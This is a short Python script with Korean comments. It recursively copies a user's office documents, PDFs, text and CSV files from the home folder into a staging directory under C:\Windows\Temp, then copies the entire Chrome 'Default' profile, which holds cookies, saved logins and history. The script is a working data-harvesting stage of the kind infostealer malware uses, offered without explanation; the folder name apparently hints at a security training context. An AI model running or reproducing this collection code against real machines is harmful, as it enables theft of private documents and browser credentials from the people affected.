# -*- coding: utf-8 -*-

import os
import shutil

from pathlib import Path
import os

USERNAME = os.environ.get("USERNAME")

SOURCE_FOLDER = str(Path.home())
DEST_FOLDER = fr"C:\Windows\Temp\Kisec"

TARGET_EXTENSIONS = {
    ".hwp", ".hwpx",
    ".doc", ".docx",
    ".xls", ".xlsx", ".xlsm", ".xlsb",
    ".ppt", ".pptx", ".pptm",
    ".pdf",
    ".txt", ".csv"
}

# 목적지 폴더가 없으면 자동 생성
os.makedirs(DEST_FOLDER, exist_ok=True)

for root, dirs, files in os.walk(SOURCE_FOLDER):
    for filename in files:
        ext = os.path.splitext(filename)[1].lower()

        if ext not in TARGET_EXTENSIONS:
            continue

        source_path = os.path.join(root, filename)

        try:
            relative_path = os.path.relpath(source_path, SOURCE_FOLDER)
            safe_name = relative_path.replace("\\", "_").replace("/", "_")
            dest_path = os.path.join(DEST_FOLDER, safe_name)

            shutil.copy2(source_path, dest_path)

            print(f"[COPIED] {source_path}")

        except PermissionError:
            print(f"[PERMISSION DENIED] {source_path}")

        except Exception as e:
            print(f"[ERROR]{source_path}: {e}")

# 복사할 폴더
FOLDERS_TO_COPY = [
    fr"C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default"
]

for folder in FOLDERS_TO_COPY:
    if not os.path.exists(folder):
        print(f"[NOT FOUND] {folder}")
        continue

    folder_name = os.path.basename(os.path.normpath(folder))
    destination = os.path.join(DEST_FOLDER, folder_name)

    try:
        shutil.copytree(
            folder,
            destination,
            dirs_exist_ok=True
        )

        print(f"[FOLDER COPIED] {folder}")

    except PermissionError:
        print(f"[PERMISSION DENIED] {folder}")

    except Exception as e:
        print(f"[ERROR] {folder}: {e}")


print("SUCCESS!")
